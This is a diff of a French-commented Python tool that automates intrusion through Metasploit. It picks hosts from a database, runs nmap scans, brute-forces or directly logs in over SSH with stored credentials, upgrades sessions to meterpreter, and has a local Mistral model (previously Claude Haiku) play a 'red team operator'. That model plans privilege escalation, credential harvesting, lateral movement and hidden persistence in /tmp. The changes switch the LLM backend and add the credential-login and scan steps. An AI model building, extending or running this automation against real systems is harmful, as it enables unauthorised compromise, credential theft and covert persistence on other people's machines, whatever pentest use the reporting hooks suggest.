@@ -16,10 +16,10 @@ from pathlib import Path
 from typing import Optional
 from pymetasploit3.msfrpc import MsfRpcClient
 
-try:
-    import anthropic as _anthropic_sdk
-except ImportError:
-    _anthropic_sdk = None
+# Ollama / Mistral LLM
+OLLAMA_BASE_URL = os.getenv('OLLAMA_BASE_URL', 'http://ollama:11434')
+OLLAMA_MODEL    = os.getenv('OLLAMA_MODEL', 'mistral:7b-instruct')
+OLLAMA_TIMEOUT  = int(os.getenv('OLLAMA_TIMEOUT', '180'))
 
 def _read_secret(name, legacy_env=None):
     """Read sensitive value: legacy env var → NAME env var → /run/secrets/name file."""
@@ -825,13 +825,7 @@ def get_host_services_by_address(address):
 
 
 def extract_search_terms_via_ai(services):
-    """Utilise Claude uniquement pour les services dont le produit n'est pas couvert par le mapping statique."""
-    if not _anthropic_sdk:
-        return set()
-    api_key = os.getenv("ANTHROPIC_API_KEY") or read_secret("anthropic_api_key")
-    if not api_key:
-        return set()
-
+    """Utilise Ollama/Mistral pour les services dont le produit n'est pas couvert par le mapping statique."""
     # Termes déjà couverts par le mapping statique
     covered_terms = set()
     for port, svc_name, *_ in services:
@@ -859,35 +853,34 @@ def extract_search_terms_via_ai(services):
         print("[AI] Tous les services couverts par le mapping statique — skip")
         return set()
 
-    print(f"[AI] {len(unmapped)} service(s) non couvert(s) → appel Claude Haiku")
+    print(f"[AI] {len(unmapped)} service(s) non couvert(s) → appel Ollama ({OLLAMA_MODEL})")
     try:
-        client = _anthropic_sdk.Anthropic(api_key=api_key)
-        response = client.messages.create(
-            model="claude-haiku-4-5",
-            max_tokens=256,
-            messages=[{
-                "role": "user",
-                "content": (
-                    "Extract Metasploit module search terms from these network services.\n"
-                    "Return only product/software names that match MSF exploit module names.\n"
-                    f"Services:\n{json.dumps(unmapped, indent=2)}\n"
-                    'Return JSON: {"search_terms": ["term1", "term2", ...]}\n'
-                    "Examples: vsftpd, proftpd, distcc, bind, postfix"
-                )
-            }],
-            output_config={"format": {
-                "type": "json_schema",
-                "schema": {
-                    "type": "object",
-                    "properties": {
-                        "search_terms": {"type": "array", "items": {"type": "string"}}
-                    },
-                    "required": ["search_terms"],
-                    "additionalProperties": False
-                }
-            }}
+        payload = {
+            'model': OLLAMA_MODEL,
+            'messages': [
+                {
+                    'role': 'system',
+                    'content': (
+                        'Extract Metasploit module search terms from network services. '
+                        'Return only product/software names that match MSF exploit module names. '
+                        'Return JSON only: {"search_terms": ["term1", "term2"]}. '
+                        'Examples: vsftpd, proftpd, distcc, bind, postfix. No markdown.'
+                    ),
+                },
+                {'role': 'user', 'content': json.dumps(unmapped)},
+            ],
+            'max_tokens': 256,
+            'temperature': 0.1,
+        }
+        resp = requests.post(
+            f'{OLLAMA_BASE_URL}/v1/chat/completions',
+            json=payload,
+            timeout=OLLAMA_TIMEOUT,
         )
-        data = json.loads(response.content[0].text)
+        resp.raise_for_status()
+        content = resp.json()['choices'][0]['message']['content'].strip()
+        start, end = content.find('{'), content.rfind('}') + 1
+        data = json.loads(content[start:end] if start >= 0 and end > start else content)
         terms = set(t.lower() for t in data.get("search_terms", []))
         print(f"[AI] Termes extraits: {sorted(terms)}")
         return terms
@@ -1022,10 +1015,12 @@ def pick_next_host():
 
     MODE_DEBUG=True  → lit dans host_debug, lecture séquentielle (ORDER BY id OFFSET curseur);
                        retourne None + reset quand liste épuisée; scan_details joint depuis hosts.
+                       username/password récupérés depuis host_debug si renseignés.
     MODE_DEBUG=False → lit dans hosts, lecture aléatoire (TABLESAMPLE SYSTEM(0.5));
                        exclut les hôtes déjà 'pwned'.
 
-    Retourne (host_id, address, scan_details) ou None.
+    Retourne (host_id, address, scan_details, username, password) ou None.
+    username/password sont None en mode normal ou si non renseignés dans host_debug.
     """
     global _seq_cursor, _seq_total
 
@@ -1046,21 +1041,24 @@ def pick_next_host():
                         _seq_total  = None
                         return None
                     cur.execute(
-                        "SELECT id, address FROM host_debug ORDER BY id LIMIT 1 OFFSET %s",
+                        "SELECT id, address, username, password, host_id FROM host_debug ORDER BY id LIMIT 1 OFFSET %s",
                         (_seq_cursor,)
                     )
                     _seq_cursor += 1
                     row = cur.fetchone()
                     if not row:
                         return None
-                    hid, addr = row
-                    # Récupérer scan_details depuis hosts si l'adresse y existe
-                    cur.execute(
-                        "SELECT scan_details FROM hosts WHERE host(address::inet) = %s LIMIT 1",
-                        (str(addr),)
-                    )
+                    hid, addr, debug_user, debug_pass, msf_host_id = row
+                    # Récupérer scan_details depuis hosts via host_id (ou fallback adresse)
+                    if msf_host_id:
+                        cur.execute("SELECT scan_details FROM hosts WHERE id = %s", (msf_host_id,))
+                    else:
+                        cur.execute(
+                            "SELECT scan_details FROM hosts WHERE host(address::inet) = %s LIMIT 1",
+                            (str(addr),)
+                        )
                     sd_row = cur.fetchone()
-                    return (hid, addr, sd_row[0] if sd_row else None)
+                    return (msf_host_id or hid, addr, sd_row[0] if sd_row else None, debug_user, debug_pass)
 
                 # ── Mode NORMAL : lecture aléatoire depuis hosts ───────────
                 else:
@@ -1076,7 +1074,11 @@ def pick_next_host():
                         f"SELECT id, address, scan_details FROM hosts TABLESAMPLE SYSTEM(0.5) "
                         f"WHERE {base_where} LIMIT 1"
                     )
-                    return cur.fetchone()
+                    row = cur.fetchone()
+                    if row is None:
+                        return None
+                    hid, addr, scan_details = row
+                    return (hid, addr, scan_details, None, None)
 
     except psycopg2.Error as e:
         print(f"[ERREUR] pick_next_host: {e}")
@@ -1122,6 +1124,64 @@ def check_target(console, fullname, rhosts, rport):
         return True
     except Exception:
         return True  # en cas d'erreur, procéder quand même
+
+
+def run_direct_ssh_login(client, host, port, username, password, upgraded_sessions, stats):
+    """
+    Connexion SSH directe avec credentials connus (mode DEBUG uniquement).
+    Utilise scanner/ssh/ssh_login avec USERNAME/PASSWORD explicites — bypass wordlists.
+    Retourne True si une session a été ouverte et upgradée.
+    """
+    print(f"[DIRECT-SSH] {host}:{port} | user={username}")
+    console = client.consoles.console()
+    try:
+        try:
+            addr = ipaddress.ip_address(str(host).split("/")[0])
+            rhosts_val = f"[{host}]" if addr.version == 6 else str(host)
+        except ValueError:
+            rhosts_val = str(host)
+
+        aux = client.modules.use('auxiliary', 'scanner/ssh/ssh_login')
+        aux['RHOSTS']           = rhosts_val
+        aux['RPORT']            = port
+        aux['USERNAME']         = username
+        aux['PASSWORD']         = password
+        aux['THREADS']          = 1
+        aux['STOP_ON_SUCCESS']  = True
+        aux['VERBOSE']          = False
+
+        sessions_before = set(client.sessions.list.keys())
+        output = console.run_module_with_output(aux, timeout=60)
+        short = (output or '').strip().replace('\n', ' ')[:200]
+        print(f"[DIRECT-SSH] {short}")
+
+        sessions_now = client.sessions.list
+        new_sessions = set(sessions_now.keys()) - sessions_before
+        if new_sessions:
+            print(f"[DIRECT-SSH] Session ouverte: {sorted(new_sessions)} — upgrade meterpreter")
+            handle_new_sessions(client, sessions_now, upgraded_sessions, host)
+            stats['pwned'].append(('scanner/ssh/ssh_login', f'port:{port}'))
+            report_vuln(str(host), 'scanner/ssh/ssh_login',
+                        f'direct ssh login port {port}', sorted(new_sessions)[0])
+            if dojo_report_pwn(str(host), 'scanner/ssh/ssh_login',
+                               f'direct credential login port {port}'):
+                stats['faraday_ok'] = True
+            return True
+
+        cred_lines = [l for l in (output or '').splitlines() if '[+]' in l]
+        if cred_lines:
+            print(f"[DIRECT-SSH] Credentials valides (pas de session MSF): {cred_lines[0].strip()}")
+            return True
+
+    except Exception as e:
+        print(f"[DIRECT-SSH] Erreur: {e}")
+    finally:
+        try:
+            console.destroy()
+        except Exception:
+            pass
+
+    return False
 
 
 def run_brute_force_service(client, host, port, cfg_name, cfg, upgraded_sessions, stats):
@@ -1382,15 +1442,9 @@ def handle_new_sessions(client, sessions, upgraded_sessions, host):
 
 def ai_post_exploitation_plan(session_info: dict, services: list, scan_details: dict) -> list:
     """
-    Demande à Claude Haiku un plan d'action MITRE ATT&CK après obtention d'une session.
+    Demande à Ollama/Mistral un plan d'action MITRE ATT&CK après obtention d'une session.
     Retourne jusqu'à 5 actions triées par priorité.
     """
-    if not _anthropic_sdk:
-        return []
-    api_key = os.getenv("ANTHROPIC_API_KEY") or read_secret("anthropic_api_key")
-    if not api_key:
-        return []
-
     context = {
         "sysinfo":  session_info.get("_sysinfo", "")[:400],
         "uid":      session_info.get("_getuid", ""),
@@ -1405,27 +1459,35 @@ def ai_post_exploitation_plan(session_info: dict, services: list, scan_details: 
         "type":     scan_details.get("type", ""),
     }
     try:
-        client_ai = _anthropic_sdk.Anthropic(api_key=api_key)
-        resp = client_ai.messages.create(
-            model="claude-haiku-4-5-20251001",
-            max_tokens=600,
-            messages=[{
-                "role": "user",
-                "content": (
-                    "You are a red team operator. A Metasploit session is open on the host below.\n"
-                    "Suggest the next 5 post-exploitation steps using MITRE ATT&CK tactics.\n"
-                    "Prioritize: privilege escalation, credential harvesting, lateral movement, "
-                    "discreet persistence (files in /tmp with innocuous names), data collection.\n"
-                    f"Context:\n{json.dumps(context, indent=2)}\n\n"
-                    "Return a JSON array only (no markdown):\n"
-                    '[{"tactic":"TAxxxx","technique":"Txxxx","name":"short name",'
-                    '"msf_module":"post/xxx/yyy","priority":1}]\n'
-                    "Use real Metasploit post/ or auxiliary/ module names. "
-                    "Leave msf_module empty if no MSF module exists."
-                ),
-            }],
+        payload = {
+            'model': OLLAMA_MODEL,
+            'messages': [
+                {
+                    'role': 'system',
+                    'content': (
+                        'You are a red team operator. A Metasploit session is open on the host below. '
+                        'Suggest the next 5 post-exploitation steps using MITRE ATT&CK tactics. '
+                        'Prioritize: privilege escalation, credential harvesting, lateral movement, '
+                        'discreet persistence (files in /tmp with innocuous names), data collection. '
+                        'Return a JSON array only (no markdown): '
+                        '[{"tactic":"TAxxxx","technique":"Txxxx","name":"short name",'
+                        '"msf_module":"post/xxx/yyy","priority":1}] '
+                        'Use real Metasploit post/ or auxiliary/ module names. '
+                        'Leave msf_module empty if no MSF module exists.'
+                    ),
+                },
+                {'role': 'user', 'content': json.dumps(context)},
+            ],
+            'max_tokens': 600,
+            'temperature': 0.2,
+        }
+        resp = requests.post(
+            f'{OLLAMA_BASE_URL}/v1/chat/completions',
+            json=payload,
+            timeout=OLLAMA_TIMEOUT,
         )
-        raw = resp.content[0].text.strip()
+        resp.raise_for_status()
+        raw = resp.json()['choices'][0]['message']['content'].strip()
         start, end = raw.find('['), raw.rfind(']') + 1
         actions = json.loads(raw[start:end] if start >= 0 and end > start else raw)
         print(f"[AI-POST] {len(actions)} tactiques: {[a.get('name','?') for a in actions]}")
@@ -1544,16 +1606,34 @@ def main():
      min_date = "2000-01-01"
      console_id = client.consoles.console().cid
      console = client.consoles.console(console_id)
-     host_id, host, scan_details_raw = row
+     host_id, host, scan_details_raw, debug_user, debug_pass = row
      scan_details = json.loads(scan_details_raw) if isinstance(scan_details_raw, str) else (scan_details_raw or {})
      products = scan_details.get('products', [])
      seq_info = f" [seq:{_seq_cursor}]" if MODE_DEBUG else ""
      prod_names = [p.get('name', p) if isinstance(p, dict) else str(p) for p in products]
-     print(f"[INFO] Cible: {host}{seq_info} | MODE_DEBUG={MODE_DEBUG} | produits: {prod_names}")
+     creds_info = f" | creds={debug_user}:***" if (MODE_DEBUG and debug_user) else ""
+     print(f"[INFO] Cible: {host}{seq_info} | MODE_DEBUG={MODE_DEBUG} | produits: {prod_names}{creds_info}")
      services = get_host_services_by_address(str(host))
      if not services:
-         print(f"[INFO] Aucun service connu pour {host} — skip.")
-         continue
+         if MODE_DEBUG:
+             print(f"[DEBUG] Aucun service connu pour {host} — lancement db_nmap via teamserver...")
+             scan_con = client.consoles.console()
+             scan_con.read()
+             scan_con.write(f"db_nmap -n --top-ports 1000 -sV --version-intensity 5 -O --reason -Pn {host}\n")
+             deadline = time.time() + 300
+             while time.time() < deadline:
+                 time.sleep(5)
+                 if not scan_con.is_busy():
+                     break
+             scan_con.destroy()
+             services = get_host_services_by_address(str(host))
+             if not services:
+                 print(f"[DEBUG] db_nmap terminé — aucun service découvert sur {host}, skip.")
+                 continue
+             print(f"[DEBUG] {len(services)} services découverts sur {host}.")
+         else:
+             print(f"[INFO] Aucun service connu pour {host} — skip.")
+             continue
      print(f"[INFO] {len(services)} services: {[(p, s) for p, s, *_ in services]}")
      os_name = get_host_os(str(host)) or 'Linux'
      # Forcer le type bm12 si classifié (iot_embedded, vuln_web)
@@ -1769,13 +1849,34 @@ def main():
                          break  # session ouverte — inutile d'essayer d'autres payloads
          check_con.destroy()
 
-     # Phase 0 : brute-force credentials (SSH en priorité si port 22 ouvert)
+     # Phase 0-pre (DEBUG) : connexion SSH directe avec credentials connus depuis host_debug
      attack_surface_vulns = {v['vuln'] for v in scan_details.get('attack_surface', [])}
-     if services:
+     direct_ssh_ok = False
+     if MODE_DEBUG and debug_user and debug_pass:
+         ssh_ports = [p for p, *_ in services if p in {22, 2222}]
+         if ssh_ports:
+             print(f"\n[PHASE 0-PRE] Connexion SSH directe {host} (creds connus)")
+             for ssh_port in ssh_ports:
+                 sessions_before_ssh = set(client.sessions.list.keys())
+                 if run_direct_ssh_login(client, host, ssh_port, debug_user, debug_pass,
+                                        upgraded_sessions, stats):
+                     direct_ssh_ok = True
+                     # Post-exploitation sur les sessions meterpreter issues de Phase 0-pre.
+                     # handle_new_sessions les ajoute déjà à upgraded_sessions, donc la boucle
+                     # post-Phase-0 (ligne suivante) les skipperait — on les traite ici explicitement.
+                     for sid, sinfo in list(client.sessions.list.items()):
+                         if sid not in sessions_before_ssh and sinfo.get('type') == 'meterpreter':
+                             run_post_exploitation(client, sid, str(host), dict(sinfo), services, scan_details)
+                     break
+
+     # Phase 0 : brute-force credentials — skippé si creds connus fournis (MODE_DEBUG)
+     if services and not (MODE_DEBUG and debug_user and debug_pass):
          ssh_open = any(p in {22, 2222} for p, *_ in services)
          print(f"\n[PHASE 0] Brute-force credentials sur {host}"
                + (" [SSH prioritaire]" if ssh_open else ""))
          run_bruteforce_phase(client, host, services, attack_surface_vulns, upgraded_sessions, stats)
+     elif MODE_DEBUG and debug_user and debug_pass:
+         print(f"\n[PHASE 0] Skip brute-force — creds connus depuis host_debug ({debug_user}).")
 
      # Post-exploitation guidée LLM sur sessions obtenues en Phase 0
      for sid, sinfo in list(client.sessions.list.items()):
